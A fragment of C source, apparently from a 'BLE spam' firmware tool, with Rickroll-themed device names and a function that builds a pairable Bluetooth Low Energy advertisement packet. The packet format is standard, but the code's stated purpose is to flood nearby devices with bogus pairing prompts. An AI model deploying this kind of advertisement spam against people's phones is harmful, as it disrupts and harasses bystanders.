    "Never Gonna Say Goodbye",
};

#define PAIR_SPAM_RICKROLL_COUNT (sizeof(pair_spam_rickroll_names) / sizeof(pair_spam_rickroll_names[0]))

/**
 * Pair Spam -- Generic Pairable BLE Device.
 *
 * Creates a simple BLE advertisement that shows up as a pairable device.
 * Layout (AD structure):
 *   [0..2]   02 01 06                       -- AD Flags (LE Discoverable, LE Connectable)
 *   [3]      LEN                            -- Complete Local Name length + type
 *   [4]      09                             -- AD type: Complete Local Name
 *   [5..]    NAME_BYTES                     -- UTF-8 device name
 *
 * Returns: up to 31 bytes
 */
static inline uint8_t ble_spam_build_pair_spam(uint8_t* buf, const char* name) {
    size_t name_len = strlen(name);
    if(name_len > 24) name_len = 24;  // Keep total under 31 bytes
    
    uint8_t i = 0;
    
    // AD Flags: Discoverable, Connectable
    buf[i++] = 0x02; buf[i++] = 0x01; buf[i++] = 0x06;
    
    // Complete Local Name
    buf[i++] = (uint8_t)(name_len + 1);  // Length: name + type byte
    buf[i++] = 0x09;                      // AD type: Complete Local Name
    memcpy(&buf[i], name, name_len);
    i += name_len;
    
    return i;
}
